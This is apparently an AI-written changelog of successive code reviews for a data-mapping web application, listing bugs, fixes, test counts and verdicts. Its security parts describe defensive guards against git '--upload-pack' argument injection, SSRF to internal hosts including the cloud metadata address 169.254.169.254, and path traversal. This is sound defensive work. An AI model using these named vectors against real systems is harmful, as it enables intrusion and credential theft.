- 🟠 mapping_project_export.py `_json` (schema `match_score: float`) — **matchScore whole-float breaks mappings.json byte-parity.** `json.dumps(1.0)`→`"1.0"` vs `JSON.stringify(1.0)`→`"1"` (reproduced). A mapping with `matchScore` 1.0/0.0 (realistic for exact/zero matches) → server vs client emit different bytes → perpetual spurious git diff on a mixed-mode remote. Golden fixture only has `matchScore:null` → uncaught. Fix: normalize whole-valued floats to int before `_json` (and audit any other float field).
- 🟠 source_concept_id_scope.py vs source-concept-ids-io.ts:275 — **entries.json NOT byte-parity front-only vs server (by design, churns a shared remote).** Server scopes entries to the project's (vocab,code); the TS builder still exports the WHOLE badge (`buildProjectSourceConceptIds`, unscoped — plan §6 says TS scoping wasn't coded). A WASM user and a server user pushing the same project to one remote → entries.json differs every push. The scoping logic (drop another project's same-badge entry) is also not exercised by any golden/parity test. Decision needed: port scoping to TS, or accept+document mixed-mode churn (+ add a cross-project scope test).
- 🟠 UploadDatasetDialog.tsx:110-116/149 — **server-mode preview re-uploads the ENTIRE file on every option change + no async race guard.** The re-parse effect calls `previewDatasetOnServer` → `uploadFileInChunks(full file)` per delimiter/skipRows/encoding/header/sheet tweak (ImportSettingsDialog does the cheap `previewDatasetByPath` — reuses the sha). `parseServer` is async, fired per change, `setParsed`/`setError` unconditional → out-of-order results can show stale columns, and a resolve after close does setState-after-unmount. Also mapping-project export download 500s on a non-latin1 project name (see 🟡 content-disposition — grouped 🟠 with this by the BE agent). Fix: upload once, cache the sha, re-preview by sha/path; add a per-call sequence token / `open` guard.

**🟡 MINOR (batch):**
- 🟡 mapping_projects.py:569-571 — **export download 500s on a non-latin1 project name.** `content-disposition: filename="{slug}.zip"` with raw `_localized(name,'en')`; Starlette latin-1-encodes headers → CJK/em-dash/emoji `UnicodeEncodeError` (a `"` also breaks the quoting). FR names are latin-1-safe so it won't show in French testing. Fix: RFC 5987 `filename*=UTF-8''<pct-encoded>` + ASCII fallback.
- 🟡 file_reader.py:61 (`_transcode_to_utf8`) — **temp file leaked on every non-UTF-8 (cp1252) CSV read.** `NamedTemporaryFile(delete=False)`, never unlinked; every preview/import/global-table build on a Windows-1252 CSV accumulates one. Fix: unlink in a `finally` after the DuckDB read (DuckDB reopens by path, so `delete=True` won't work).
- 🟡 WorkspacesPage.tsx:184 (`handleCloneEntity`) — **manual clone-retry orphans a git-linked mapping project into `workspaceId:''`.** Calls `cloneEntityContent(e)` with no opts → `applyClonedEntity(…, undefined)` → `import.ts` writes `workspaceId: ''` (entity-io.ts:1715 `workspaceId ?? ''`). Only on the error-recovery path (auto-clone failed on a missing token, user clicks Clone). Fix: thread the target ws id into `handleCloneEntity` like the auto-clone loop (WorkspacesPage.tsx:722).
- 🟡 dataset_parser.py `_infer_types_sql` (`trim`) vs type_inference.py:58 (`.strip()`) — DuckDB `trim()` strips only spaces; Python `.strip()` strips all whitespace → a `"\ttrue"` boolean or tab-padded date infers differently in preview vs import (numbers neutralized by DOUBLE cast). Narrow. Fix: `trim(c, ' \t\n\r')`.
- 🟡 entity-io.ts:559-576 — dashboard tabs/widgets/dashboards emitted in storage (PK) order, not sorted by content key → array order still churns across instances (ids are now stable, order isn't). Not a regression, but undermines the byte-stability goal. Fix: sort by content key before serialize.
- 🟡 d3e4f5a6b7c8 (localize affiliation/profession) — `downgrade` alters Text→String(255); a >255-char localized JSON would truncate/fail on downgrade (rare; downgrade only). 
- 🟡 SqlScriptsEditorPage.tsx:239/277/282 — hardcoded English output-tab labels (`Preview — …`, `… (selection)`, `…:line`); matches a pre-existing untranslated `Result — …` at :211. Add `sql_scripts.tab_*` keys.
- 🟡 activity_touch.py:596-600 — the two-hop widget→dashboard fallback SELECT (tab not session-resident) is untested (the test pre-loads the tab). Add a widget-edit-without-preloaded-tab test.
- 🟡 UploadDatasetDialog.tsx:406 — `fileName: name` (user-editable display name) now feeds `dsChildPath` instead of the original `file.name`; verify the server path builder sanitizes it. File sizes: Header.tsx 837 / SqlScriptsEditorPage.tsx 1022 (>800; extraction suggested, non-blocking). AuthorDetails affiliation/profession LocalizedString key order can churn provenance snapshots (low impact — written once).
- 🟡 git_service.py:147-153 (`remove_repo`) — `rmtree(data_path/kind/entity_id)` with no `_safe_join` guard (callers pass trusted DB ids today; harden anyway). git_credential set_git_remote_config + set_token_for_url are two independent commits (self-healing).

Verified sound ✅ (actively probed, no finding):
- **Mapping-project export byte-parity** is genuinely double-pinned: the pure builder (`test_mapping_project_export`) and the full DB→dict→builder path (`test_mapping_project_export_assemble`) both assert byte-for-byte against the SAME `expected/` fixture the TS golden test (`export-golden.test.ts`) also asserts against — two independent producers, one frozen fixture. JSON serialization (`indent=2`, `separators=(",",": ")`, `ensure_ascii=False`, no trailing newline, insertion-order keys), `dataSourceId` reset-in-place, `fileSourceData` re-append, `organization` append, `.gitignore` bytes — all match. `compareCodePoints` (`a<b?-1:…`) == Python native str/tuple sort for BMP; `mappingKey` tie-break gives a total order. `_portable_ranges`/`_compact_entries` sort + `_range_dict` reconciliation (monotone nextId, window-scoped totalConcepts, no double-count) verified + tested.
- **Git security core:** every new git-feeding path applies `_safe_ref`/`_safe_oid` (reject leading `-` → no `--upload-pack` RCE) + `_reject_internal_host` (SSRF, incl. 169.254.169.254) + `_safe_join` (traversal); tokens Fernet-encrypted, never in `.git/config`, never returned by any schema (`has_token` only), scrubbed from errors; per (user,host) with `UniqueConstraint` + cross-user isolation test. All `/settings/account/*` admin-gated; host-token endpoints user-scoped.
- **Settings import excludes passwords/privilege** (new users disabled+passwordless, existing password/is_active untouched, roles forced `is_system=False`, permissions filtered to `ALL_PERMISSIONS`) — except the imported-`admin`-role gap (🟠 above).
- **source-concept-id reconcile/merge** (`resolveImportedRange`, `reconcileRangeWithEntries`, `reconcileImportedEntries`, `mergeSourceConceptIdRegistry`): local-id preservation, diverged-badge drop, monotone nextId, no blind overwrite, order-independent — thoroughly tested (not happy-path only).
- **importMappingProjectContent** order + best-effort steps + `createdAt ?? now`; **stripInstanceFields** dropping linkedDataSourceIds/empty-createdAt with every consumer `?? []`-safe; **ATHENA vocab-ref skip**; **activity_touch** bumps only the direct parent, no cross-authz write.
- **UsersTab** client affordances mirror the server guards (self-guard, block-enable-passwordless, last-admin guards) with disabled+title, no misleading affordance; **Markdown-on-run** sanitized via rehypeSanitize (no dangerouslySetInnerHTML); **type-name-to-confirm delete** fails closed; run-selection shortcut + file-tree drag/drop guards correct.
- **refreshStatus race** guarded by `statusGen`; stale ZIP/diff cache invalidated on pull/includeData/branch/LFS; per-action spinner cleared in `finally`; `buildQuickActions` grouping/A-M-D tested. Alembic chain linear/single-head/symmetric. No new `any`, no console.log, no unsanitized dangerouslySetInnerHTML, no secrets in touched files.

Carried follow-ups (non-blocking): `loadSyncState` gen guard (git-sync-store); `isDataFilePath` divergence from `isDataFile` (.pq); `dashboardNaturalKey` empty-name fallback mismatch; `project-pull.ts` has zero tests (highest-risk overlay/overwrite logic untested — a test would have caught the datasetAnalyses 🟠). Pre-existing/systemic (out of scope): the 4 `data_sources.detail_visit*` EN/FR mismatches (resolved 2026-07-22: dead keys removed); `workspace_id is None → no access check` pattern.

### Fixes applied this review (uncommitted, awaiting user test) — 2026-07-22

The user approved fixing **all** findings. Applied (verified in source; the two 🔴 reproduced empirically before AND after the fix):

**🔴 (both fixed):**
- **French-boolean data loss** (dataset_rows.py) — `_typed_projection` now emits an explicit `CASE WHEN lower(trim(x)) IN (<true-tokens>) … ELSE NULL` for boolean columns (token sets imported from type_inference), mirroring `parse_boolean` instead of DuckDB's narrower `try_cast AS BOOLEAN`. Reproduced pre-fix (`oui/non/vrai/faux/o → NULL`) and confirmed post-fix (`→ True/False`, `yes/no → True/False`, unknown → None). Test `test_french_boolean_tokens_survive_the_write`.
- **uid:undefined import** (ProjectsPage.tsx) — a plain import with a stripped/absent `project.uid` now mints a fresh uid (`!project.uid → crypto.randomUUID()`) before the collision check + delete-then-create, so it can't operate on `undefined`. Duplicate/git-pull paths unchanged.

**🟠 (5 fixed, 1 deferred):**
- **settings-import admin escalation** (settings_import_service.py) — an imported `role:"admin"` is now REFUSED → `user` with a warning (no latent-admin creation, no silent promotion of a live account); a locally-existing admin is never demoted by import either. Removed the now-dead per-row `_active_admin_count` demotion race. Tests: refuse-on-new, cannot-promote-existing, cannot-demote-existing.
- **pull-overwrite datasetAnalyses** (project-pull.ts) — the datasets branch now `deleteByDataset`s analyses before deleting the file (mirrors the full-import cleanup), so the deterministic-id `db.add` re-import no longer throws ConstraintError and half-deletes the dataset.
- **3 missing i18n keys** — `file_cat_organizations`/`_users`/`_roles` added to en+fr.
- **matchScore byte-parity** (mapping_project_export.py) — new `_js_numbers` normalizes whole-valued floats to int before `_json` (bool guarded out), so `1.0→"1"` like `JSON.stringify`. Test `test_whole_float_matchscore_serializes_like_js`.
- **UploadDatasetDialog re-upload + race** — new `previewDatasetBySha` (no re-upload); the dialog uploads the raw file ONCE (sha cached per File ref) and re-previews by sha on option tweaks; a `previewSeqRef` token discards out-of-order/after-close responses.
- **entries.json TS scoping — DEFERRED (not fixed).** Ported a pure `scopeEntriesToProject`/`sourceConceptPairKey` (tested) but did NOT wire it into the builder: the golden fixture proved the server scopes by the DuckDB-**deduped source dictionary** (its entries `20112-9`/`a,b` come from the CSV, not the mappings `ZZ`/`AA`), so a mappings-only scope drops entries the server keeps — a third divergent behaviour that broke the byte-parity golden test. Reproducing the dictionary read (CSV quoting + QUALIFY dedup + terminology fallback) in the export path risks new drift, so front-only keeps whole-badge export; documented as a known limitation in buildProjectSourceConceptIds. `git-file-meta.ts` scope keys were fixed anyway (the i18n 🟠). 

**🟡 batch (all fixed):**
- content-disposition RFC 5987 (`_attachment_disposition`: ASCII fallback + `filename*=UTF-8''`) so a non-latin1 project name can't 500 the export download.
- transcode temp leak — `_transcode_to_utf8` registers its UTF-8 temp against the connection; new `cleanup_transcoded(con)` called in every `build_read_expr` caller's `finally` (db_connect ×2, dataset_parser ×2). Test `test_transcoded_temp_is_cleaned_up`.
- clone-retry orphan (WorkspacesPage.tsx) — a `gitLinkedWsId` state carries the target ws into the manual retry so it no longer restores into `workspaceId:''`.
- trim vs strip (dataset_parser.py) — `_infer_types_sql` now trims the explicit ASCII-whitespace set (`trim(c, ' '||chr(9)||chr(10)||chr(13)||chr(11)||chr(12))`) so a tab/newline-padded boolean/date infers the same in preview and import.
- dashboard export order (entity-io.ts) — dashboards sorted by dashKey, tabs by key, widgets by (tabKey, key) via compareCodePoints so array order is byte-stable across instances.
- SQL-scripts labels (SqlScriptsEditorPage.tsx) — `Result — `/`Preview — `/`(selection)` → i18n keys `sql_scripts.tab_result`/`tab_preview`/`label_selection` (en+fr), effect deps updated.
- remove_repo (git_service.py) — now `_safe_join`-guards the entity_id before the rmtree (defense in depth). activity_touch — new test `test_editing_a_widget_bumps_dashboard_via_db_fallback` exercises the previously-uncovered two-hop DB SELECT.

**NOT changed:** the parity-edge entries.json scoping (deferred, above). The prior-review carried follow-ups (loadSyncState gen guard, isDataFilePath .pq, dashboardNaturalKey empty-name, project-pull tests) left for a dedicated pass.

Verification: frontend **369 tests** pass (+15: scope ×3 + suite growth) + **0 lint errors** (153 pre-existing React-Compiler warnings) + typecheck clean on all touched files (the 1 tsc error is in `workspace-export-golden.test.ts`, an **untracked parallel-session WIP file outside this review range** — flagged to the user, not ours to fix); backend touched-area suites **103 pass** (+21) + ruff clean on all touched files; i18n parity clean (only the 4 pre-existing `detail_visit*` — resolved 2026-07-22: dead keys removed). All uncommitted, awaiting the user's app test.

---

## 2026-07-17 — Plugin provenance + concept-mapping Progress breakdown/instant-editor + export-stripping/portable-ids + versioning diff-cache/LFS-opt-in + i18n empty-lang fallback

- Reviewed by: Claude Opus 4.8 — 4 parallel adversarial Explore sub-agents by feature group (plugin-provenance BE+FE, concept-mapping ProgressTab/instant-editor/badges, export-stripping/import-restamp/localized, versioning diff-cache/LFS/git-file-classify) + reviewer re-verified EVERY reported finding directly in source (the 🔴 mapping-import restamp reproduced against the type + both import paths; the export-sort many-to-many tie reproduced by tracing the row key; the plugin org-precedence traced through CardMetaFooter's `liveOrg ?? organization`).
- Range: 950d711f..0b6e5748 (**15 commits, 69 files, ~1,478 insertions / ~482 deletions**). Note: the first commit (`db48e478`) is the 2026-07-16 review's own fixes landing — spot-checked intact (DQ authz 🔴: `rule_set_id` now required + unconditional auth + workspace_id stamped server-side; view-mode widget gating; mapping filter fallback; column-id `\p{Mn}` parity). New work: **plugin provenance** (author/org trio + frozen org snapshot brought to parity with the other 7 exportables — model+schema+service+migration `c2d3e4f5a6b7`, `created_by_id` popped + re-derived via `stamp_creator`, FK Postgres-only); **card live re-hydration** (CardMetaFooter resolves author+org live, snapshot fallback, render-loop-safe via stable selectors + useMemo); **concept-mapping Progress breakdown** by vocab/category (ProgressTab +399, StatusBar, status-colors, equivalence-badge) + **instant editor** (optimistic createMapping w/ rollback); **portable source-concept-ids** + **export field-stripping** (mappings.json/project.json strip instance fields, stable sort, scores parquet gitignored) + **import createdAt re-stamp** (crash fix on stripped ZIPs); **versioning** per-file diff cache + rebuild-on-refresh + **LFS opt-in only** (no auto size/ext rule); **i18n empty-language fallback** (`||`+`find(Boolean)`). Version stays **2.1.2** (user chose not to bump this review).
- Last reviewed commit: 0b6e5748fc01deba505f20954891fe1d2982b83a
- Verdict: **Fix-then-ship** — 1 🔴 (mapping-project import doesn't re-stamp stripped `createdAt` → server-mode import failure) + 3 🟠 (export sort not total for many-to-many → spurious git diffs; Progress bar drops `suggested` concepts; plugin card org-precedence backwards) + a 🟡 batch. **User approved fixing ALL findings; applied this review (uncommitted, awaiting app test). Per the user's steer, `suggested` now counts as unmapped across ALL three Progress views (pie + mapped column + bar), not just the bar.**
- Tests: frontend **296 passed** (25 files, +3: 2 localized + 1 export determinism) · backend plugin+DQ **10 passed** (via `apps/api/.venv`) · Lint: **0 errors** (151 pre-existing React-Compiler warnings) · Typecheck: **0 errors** · Ruff: clean on touched · i18n parity: clean (only the 4 pre-existing `data_sources.detail_visit*` — resolved 2026-07-22: dead keys removed).
- Reminder: `apps/api` is **not in the shipping build** (prod = static WASM). The 🔴 bites hardest in server mode (NOT-NULL rejects `undefined createdAt`); in client mode it silently persisted an invalid record.

Findings (all re-verified in source; all fixed this review):

**🔴 CRITICAL (fixed):**
- 🔴 MappingProjectListPage.tsx:210-211 + :254 — **mapping-project import doesn't re-stamp `createdAt` on stripped ZIPs.** This is the direct consumer of the new export-stripping, and the one import path the `9c547688` "re-stamp createdAt" fix missed (it covered ProjectsPage/WorkspacesPage/seed-loader/`importProjectSourceConceptIds`). On a **plain** import (not duplicate), `createdAt` came from `...project` — but `stripInstanceFields` removed it → persists `createdAt: undefined` (required by `MappingProject`). Same at :254: source-id ranges saved `{ ...r, workspaceId: ws }` directly instead of via the re-stamping helper, and `toPortableRanges` strips timestamps → `createdAt/updatedAt: undefined` (required by `SourceConceptIdRange`). Server-mode NOT-NULL rejects the write → the "stripped ZIP" import the feature targets fails. Fix: `createdAt: project.createdAt ?? now` on the entity, and re-stamp ranges `{ ...r, workspaceId: ws, createdAt: r.createdAt ?? now, updatedAt: now }` (mirrors `importProjectSourceConceptIds`).

**🟠 IMPORTANT (fixed):**
- 🟠 export.ts:575-579 (`serializeMappingsForVersioning`) — **mappings.json sort not total for many-to-many source concepts.** A source concept can map to several targets (the MappingsTab row key is `vocab\0code\0targetConceptId` precisely because `(vocab,code)` isn't unique). Tie-break was `(sourceConceptCode, sourceConceptId)` only → tied rows follow DB iteration order (stable per-run but not content-derived) → spurious git diffs across instances/reindex, defeating the docstring's own "DB ordering never shows up as a spurious diff" promise. Fix: sort by sourceConceptCode first (readable diffs), then break every remaining tie by `mappingKey()` (the merge's own full source+target identity → total order). Test added (both input orders → identical output).
- 🟠 ProgressTab.tsx:30-32 + stats — **Progress breakdown silently dropped `suggested` concepts.** `mappedTotal` summed all of `byStatus` (incl. suggested) so they left `unmapped`, but `STATUS_SEGMENT_ORDER` had no `suggested` slice → bar under-filled (sum < 100%), those concepts invisible; the status pie on the same tab *did* show them → the two disagreed. Per the user's decision, **fixed so `suggested` = unmapped everywhere**: excluded from `nonIgnoredMappings`/`allSourceKeys`/`sourceStatusCounts` (pie) AND from `bestPerKey` (bar `continue`), so it now falls into the unmapped remainder consistently across pie + `mapped` column + bar. (Also fixed a latent bug: `statusPriority` never listed `suggested`, so `indexOf` returned -1 → a suggested mapping wrongly won "best status".)
- 🟠 PluginsTab.tsx:402 + card-meta-footer.tsx:167-168 — **plugin card org-precedence backwards vs. the documented contract.** Store + export both say "own org wins over the workspace's" (`attachEntityOrganization` = `entity.organization ?? resolve(...)`), but PluginsTab passed `organizationId={workspaceOrgId}` alongside `organization={plugin.organization}` (two different sources) and the footer does `liveOrg ?? organization` → the workspace org shadowed an imported plugin's own org. (Correct callers like WorkspacesPage pass both from the same record.) Narrow trigger (imported plugin whose origin org ≠ workspace's). Fix: `organizationId={plugin.organization ? undefined : workspaceOrgId}` so the plugin's own frozen org wins.

**🟡 MINOR (all fixed):**
- 🟡 git-sync-store.ts:305-313 (`toggleLfs`) — **diff cache not invalidated on LFS toggle.** Cache key is `branch|path` only; toggling LFS changes a file's diff (dedicated `no_content_change` truncation mode) + the `.gitattributes` diff, but didn't clear `_diffCache`. Since the cache was promoted to module-level this range, reopening the dialog after a toggle now showed a stale diff (didn't survive close before). Fix: `toggleLfs` calls `invalidateZip()`.
- 🟡 git-sync-store.ts:207-209 — **`includeData` default-selection branch bypassed the config-file filter.** When on, the inline default only excluded deletions → a modified `.gitignore`/`.gitattributes` got preselected, defeating `819e9d3b`. Fix: exported `isUnownedConfigModification` from git-file-classify and applied it in that branch too.
- 🟡 ProgressTab.tsx (stats loader) — **lost cancellation guard.** The refactor to a `useCallback` invoked from two effects dropped the old `cancelled` flag → a stale load could overwrite fresh stats / setState-after-unmount. Fix: per-invocation `loadGen` ref; a load commits `setTotalSourceConcepts`+`setGroupTotals` only if still latest (both now written together after the guard).
- 🟡 ProgressTab.tsx:222/241 — `#9ca3af`/`#e2e8f0` color literals duplicated `status-colors.ts` → use `STATUS_FALLBACK_COLOR`/`UNMAPPED_COLOR` constants.
- 🟡 localized.ts — the load-bearing `find(Boolean)` branch (empty en + non-empty other lang) and both-empty were untested → 2 assertions added.
- 🟡 PluginsTab.tsx:323 (`doPluginImport`) — `finalizeEntityZip` writes `.gitattributes` for an LFS-bearing plugin; import stripped only `_plugin.json` → it landed as a plugin "source file." Fix: `delete updatedFiles['.gitattributes']`.
- 🟡 git-sync-store.ts:36/126/146 — stale "automatic size/extension rule" comments (LFS is opt-in now) → corrected.
- 🟡 user_plugin_service.py:create — investigated the "redundant setattr before stamp_creator" nit: **NOT changed the way the sub-agent proposed** (popping `created_by`/`created_by_details` would break imports — `stamp_creator` reads the snapshot from the `payload`, not the entity, so popping them would lose an imported author). Left the harmless setattr and documented why it's fine.

Verified sound ✅ (actively probed, no finding):
- **Plugin provenance BE:** migration chain linear/single-head (`c2d3e4f5a6b7` sole child of `b1c2d3e4f5a6`, new head), all-nullable columns (no data loss), FK Postgres-only (SQLite can't ALTER-ADD), up/down symmetric; `created_by_id` never an authz key (all routes gate on `plugins:read/write/delete`); `UserPluginUpdate` accepts no provenance fields → `update` can't spoof `created_by_id`; `created_by_id` popped in `create` + re-derived by ORCID/email in `stamp_creator`. Round-trip (`buildUserPluginFolder`/`_plugin.json`/`attachEntityOrganization`) keeps createdBy+snapshot+org, drops createdById. Mirrors Cohort/Project pattern.
- **CardMetaFooter re-hydration:** stable selectors (`s.user`, `s.byId[id]`, `getOrganization` element ref) + `useMemo([me,dirUser])` avoid the Maximum-update-depth loop; no registered buffer, no leak.
- **Optimistic createMapping:** inserts, awaits persistence in try, on failure removes from map + array, bumps versions, invalidates caches, re-throws (skips stats recompute). Direct Map mutation is the store's documented pattern.
- **SQL safety (mapping-queries breakdown):** `dimension` is the closed union `'vocabulary_id'|'category'` (TS-constrained, callers iterate a literal array) — no user data in SQL; group/total/source_concepts are static literals; all values through `esc()`; file-source-without-terminology-column falls back to `concept_code IN(...)` (tested).
- **DQ authz fix (prev review, now landed):** `DqRunHistoryCreate.rule_set_id` required, `create_run` auth unconditional, `workspace_id` stamped from the rule set. Correct.
- **LFS opt-in migration:** no lingering `isLfsCandidate`/`LFS_SIZE_THRESHOLD`/`LFS_EXTENSIONS`; `resolveLfsPaths` tracks only `override === true`; `.gitattributes` regenerated per export. **rebuild-on-refresh:** `refreshStatus` calls `invalidateZip()` before `buildZip` (fixes stale-ZIP-hides-DB-edits); rebuild only on explicit refresh/branch/toggle/commit/pull, not tab re-entry.
- **localized fallback:** `||`+`find(Boolean)` correct for all cases (empty-lang, empty-en, both-empty, null, legacy string); no whitespace regression.
- **column-id parity:** TS `\p{Mn}` == Python `Mn` category; fixture case `a<U+0483>b → col_ab` agrees.
- No new `any`, no `console.log`, no dangerouslySetInnerHTML, no secrets in touched files; largest touched file (ProgressTab ~560 lines) under 800.

Carried follow-ups (non-blocking, pre-existing): `buildConceptUnionParts` heterogeneous UNION can Binder-Error on multi-dictionary sources where some map a `category` column and some don't — the new category-grouping path newly exercises it but the flaw predates this range (harden with `NULL AS category` for absent dicts). Pre-existing/systemic (out of scope): the 4 `data_sources.detail_visit*` EN/FR mismatches (resolved 2026-07-22: dead keys removed); the equivalence-badge English `label` values (unchanged this range); the `workspace_id is None → no access check` pattern (planned access-group rework).

### Fixes applied this review (uncommitted, awaiting user test) — 2026-07-17

The user approved fixing **all** findings and steered `suggested` → unmapped across all three Progress views. Applied: the 🔴 (mapping-import re-stamp, project + ranges); the 3 🟠 (export sort total via `mappingKey` tie-break + test; ProgressTab suggested-as-unmapped in pie/column/bar + latent statusPriority bug; plugin org-precedence); the 🟡 batch (toggleLfs cache invalidation, includeData config filter + exported helper, ProgressTab loadGen guard + color constants, localized ×2 tests, PluginsTab `.gitattributes` strip, git-sync-store stale comments). The backend "redundant setattr" nit was deliberately NOT changed (the proposed fix would break imports). Version stays **2.1.2** (user chose not to bump this review).

Verification: frontend **296 tests** pass + **0 lint errors** + **0 typecheck errors**; backend plugin+DQ **10 pass** + ruff clean on touched; i18n parity clean. All uncommitted, awaiting the user's app test.

---

## 2026-07-16 — Dashboards keep-alive/localized-names + DQ enable-disable/run-history + concept-mapping dedup+filters + deterministic column ids + import UX

- Range: d0077b07..950d711f (46 commits) · Last reviewed commit: 950d711f88fbd4c27022841218cbeb096ecec59f · Verdict: Fix-then-ship (all findings fixed)
- Covered: dashboards keep-alive + localized tab/widget names, DQ enable/disable + scan-run history (incl. a server-mode run-history authz 🔴), concept-mapping dedup/multi-select filters, deterministic name-derived column ids (TS/Python twins), import-error UX.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-13 — Concept-mapping pull/merge + server-owned renders (viewer-RCE fix) + provenance/lineage + alembic collapse + UI unification

- Range: dd96b39a..d0077b07 (69 commits) · Last reviewed commit: d0077b074e41e02c5e1b7171260cb63a702d8f8c · Verdict: Fix-then-ship (all findings fixed)
- Covered: concept-mapping pull (3-way merge), server-owned render builders closing the viewer-RCE, author/org provenance + lineageId, alembic collapse to one initial schema, unified list-page UI; fixed git `synced_oid`/`branch` command injection + cross-workspace project-import clobber.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-12 — Git versioning backend + permission-catalogue rework + plugins/schema-preset/dialog UX

- Range: 5137bc09..dd96b39a (89 commits) · Last reviewed commit: dd96b39aac8bb8c1b5e095183e77df235365cab8 · Verdict: Fix-then-ship
- Covered: server-side git versioning + LFS, permission-catalogue rework (3-tier RWD), plugins/schema-preset/dialog UX; fixed diff path traversal, clone/verify SSRF, refreshStatus race, schema-preset id-guard; the viewer `purpose="render"` 🔴 was closed by the 2026-07-13 server-owned renders.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-10 — Full-stack second wave: dashboards/members/attachments/global-table + UI role-gating + server-mode data paths

- Range: 22f01a8c..5137bc09 (100 commits) · Last reviewed commit: 5137bc09edeff95676f0142dd4d5461bf1cffe17 · Verdict: Fix-then-ship (all approved items fixed)
- Covered: dashboards/members/attachments persistence, 3-dimension RBAC, global-table service, UI role-gating, server-mode data paths; fixed stale-role window + blank-table race (front) and query viewer→editor + preview-columns access check + DSN whitespace escaping (back).
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-08 — Full-stack backend review (Groups A–I) — COMPLETE

- Range: eac0095f..22f01a8c (170 commits) · Last reviewed commit: 22f01a8c271b63bd8ba33860c995120007b04bbf · Verdict: Fix-then-ship → Ship it (all blockers fixed in commit e860150c + post-review hardening)
- Covered: the whole FastAPI backend landing by coherent file groups; 5 🔴 fixed (secret-key boot guard, organizations admin-only, blob sha traversal, DSN injection, /execute+terminal authz) + upload size cap, CORS guard, PTY session cap.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-05 — Author provenance mixin + suggestion-category filter + review-page redesign + change-password dialog

- Range: 7d357873..eac0095f (20 commits) · Last reviewed commit: eac0095f749522d8ffe6d615aee0a0e60c75ed4e · Verdict: Ship it
- Covered: `AuthorDetails`/`Authored` mixin + `stampAuthored()`, per-suggestion-category source filter, review-page redesign, ChangePasswordDialog (server endpoint owed at the time — since landed with the auth backend).
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-07-03 — LocalizedString migration + short-id URLs + entity actions menu + concept-mapping provenance

- Range: d24ec2cc..7d357873 (32 commits) · Last reviewed commit: 7d357873396511570fee2400d2828245e9b6e724 · Verdict: Fix-then-ship → Ship it
- Covered: string→LocalizedString migration (fixed the 10-error typecheck regression it introduced), git-style short-id URLs, shared entity-actions menu, concept-set provenance + scores-parquet export/import.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-06-27 — Unified seed manifest + re-seed/delete flow + modal/UI polish

- Range: 35f9160a..d24ec2cc · Last reviewed commit: d24ec2cc989ac9257e21fd2bccd5504f6a1d3dd5 · Verdict: Ship it
- Covered: unified seed manifest, targeted re-seed + removed-entity deletion (user-content-safe), import-conflict UX; fixed a baseline drop of user-origin children on workspace removal.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-06-24 — Dashboard rewrite (nested tabs, grid fit-to-height, filters, export/move trees, fullscreen)

- Range: 04ece659..35f9160a (10 commits) · Last reviewed commit: 35f9160a3312e4b1ecfc28f0e53c26822f218b88 · Verdict: Ship it (after fixes) — merged to main
- Covered: nested dashboard tabs, 48-col grid + fit-to-height, filter UX, export/move trees, fullscreen; fixed grid-migration idempotency, widget-result cache invalidation, tree cycle guard.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-06-24 — ESLint & TypeScript backlog clearance + merge to main

- Range: 778ff498..04ece659 (19 commits) · Last reviewed commit: 04ece6596e0b538ab0d21f117906e88da6a34973 · Verdict: Ship it — merged to main
- Covered: full lint + typecheck backlog driven to 0 errors (all three gates now blocking); verified the hook/ref reorderings and dead-code deletions introduced no regressions.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-06-23 — Quality harness branch (`quality-harness`)

- Range: 8d00601e..778ff498 (5 commits) · Last reviewed commit: 778ff498dfc443a9aa8fc2db1c6d0ed6285e862a · Verdict: Ship it (after the one fix)
- Covered: Vitest harness + CI quality stage + pre-push hook, lint cleanup, risky dead-code deletions (verified safe); fixed the `prepare` git-hook script failing CI when `.git` is absent.
- Findings resolved or captured in "Open items" above; details elided 2026-07-22.

---

## 2026-06-23 — Baseline (review harness set up)

- Range: — (baseline) · Last reviewed commit: 23bf12d45f9926b51d22206bb37dc98365fe1e91 · Verdict: —
- Starting point of the review chain; no review performed.
